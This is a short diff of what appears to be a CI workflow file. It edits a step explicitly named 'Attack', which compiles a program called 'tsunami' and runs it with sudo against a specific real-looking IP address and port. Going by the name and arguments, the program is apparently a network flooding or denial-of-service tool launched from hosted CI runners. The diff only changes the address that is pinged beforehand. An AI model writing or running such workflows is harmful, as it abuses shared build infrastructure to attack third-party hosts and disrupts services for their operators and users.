@@ -15,7 +15,7 @@ jobs:
 
       - name: Attack
         run: |
-          ping 162.62.226.157
+          ping 43.131.60.242
           clang -std=c23 -march=native -O3 -o tsunami tsunami.c -pthread
           sudo ./tsunami 162.62.226.157 14107 4
 
